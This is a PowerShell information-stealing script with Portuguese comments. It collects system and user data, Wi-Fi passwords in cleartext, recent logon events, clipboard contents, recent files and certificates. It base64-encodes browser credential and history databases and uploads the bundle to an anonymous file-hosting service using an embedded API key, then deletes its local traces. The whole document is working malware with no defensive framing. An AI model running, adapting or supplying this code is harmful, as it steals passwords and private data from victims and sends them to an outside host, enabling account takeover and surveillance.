# KIT v5 – TXT único, sem ZIP, sem corromper
$kit = "$env:TEMP\k"
ni -ItemType Directory $kit -Force | Out-Null
$out = "$kit\full.txt"          # único arquivo de saída

# ---------- 1) FUNÇÃO AUXILIAR ----------
function Add-Kit {
    param($Title, $ScriptBlock)
    "----- INÍCIO $Title -----" | Out-File $out -Append -Encoding UTF8
    Invoke-Command -ScriptBlock $ScriptBlock | Out-File $out -Append -Encoding UTF8
    "----- FIM $Title -----`r`n" | Out-File $out -Append -Encoding UTF8
}

# ---------- 2) COLETA ----------
Add-Kit 'SYSTEMINFO'   { systeminfo }
Add-Kit 'HARDWARE'     {
    Get-CimInstance Win32_ComputerSystem
    Get-CimInstance Win32_Processor
    Get-CimInstance Win32_BIOS
}
Add-Kit 'REDE'         { Get-NetIPConfiguration }
Add-Kit 'WLAN' {
    netsh wlan export profile key=clear folder=$kit | Out-Null
    Get-ChildItem $kit -Filter '*.xml' | %{ Get-Content $_.FullName -Raw }
}
Add-Kit 'USUÁRIOS'     { Get-CimInstance Win32_UserAccount }
Add-Kit 'ADMINISTRADORES' { net localgroup administradores }
Add-Kit 'LOGON' {
    Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0 |
        Select TimeCreated, Message
}
Add-Kit 'CLIPBOARD'    { Get-Clipboard }
Add-Kit 'ARQUIVOS-RECENTES' {
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Name -EA 0
}
Add-Kit 'CERTIFICADOS' {
    Get-ChildItem Cert:\CurrentUser\My |
        Select Subject, Thumbprint, NotAfter
}

# ---------- 3) NAVEGADORES (base64 para não quebrar encoding) ----------
@('Login Data','History','logins.json') | %{
    Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0 |
        Select -First 1 | %{
            if(Test-Path $_.FullName){
                $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
                "----- INÍCIO NAVEGADOR $($_.Name) -----" | Out-File $out -Append -Encoding UTF8
                $b64 | Out-File $out -Append -Encoding UTF8
                "----- FIM NAVEGADOR $($_.Name) -----`r`n" | Out-File $out -Append -Encoding UTF8
            }
        }
}

# ---------- 4) UPLOAD ----------
$file = Get-Item $out
$key  = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$uri  = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"

try{
    $boundary = [System.Guid]::NewGuid().ToString()
    $lf = "`r`n"
    $body = (
        "--$boundary$lf" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf" +
        "Content-Type: application/octet-stream$lf$lf" +
        [System.IO.File]::ReadAllBytes($file.FullName) +
        "$lf--$boundary--$lf"
    )
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
    $resp  = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
    $resp.data.file.url.full
}catch{
    Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
}

# ---------- 5) LIMPEZA ----------
Remove-Item $kit -Recurse -Force
